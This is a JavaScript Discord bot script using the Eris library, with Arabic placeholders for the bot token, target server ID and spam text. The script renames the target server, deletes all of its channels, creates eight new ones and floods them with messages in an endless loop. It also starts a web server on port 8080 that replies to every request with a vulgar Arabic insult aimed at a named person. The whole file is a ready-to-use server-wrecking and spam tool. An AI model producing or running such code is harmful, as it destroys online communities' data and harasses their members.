const Eris = require('eris');

const token = 'توكنك';
const guildId = 'ايدي السيرفر';
const newGuildName = 'اسم السيرفر'
const channelName = 'اسم الرومات';
const channelCount = 8;
const messageContent ='سبامك';

const bot = new Eris(token);

bot.on('ready', async () => {
    try {
        const guild = bot.guilds.get(guildId);
        if (!guild) {
            console.error('Guild not found!');
            return;
        }
        
        await guild.edit({ name: newGuildName });

        const deletePromises = guild.channels.map(channel => channel.delete().catch(console.error));
        await Promise.all(deletePromises);

        const createPromises = [];
        for (let i = 0; i < channelCount; i++) {
            createPromises.push(guild.createChannel(channelName, 0).catch(console.error));
        }
        const channels = await Promise.all(createPromises);

        const sendMessages = async () => {
            while (true) {
                const messagePromises = channels.map(channel => channel.createMessage(messageContent).catch(console.error));
                await Promise.all(messagePromises);
            }
        };
        sendMessages();
    } catch (error) {
        console.error('Error:', error);
    }
});

bot.connect();

var http = require('http');

http.createServer(function (req, res) {
  res.write("كسم علاوي بزبي");
  res.end();
}).listen(8080);
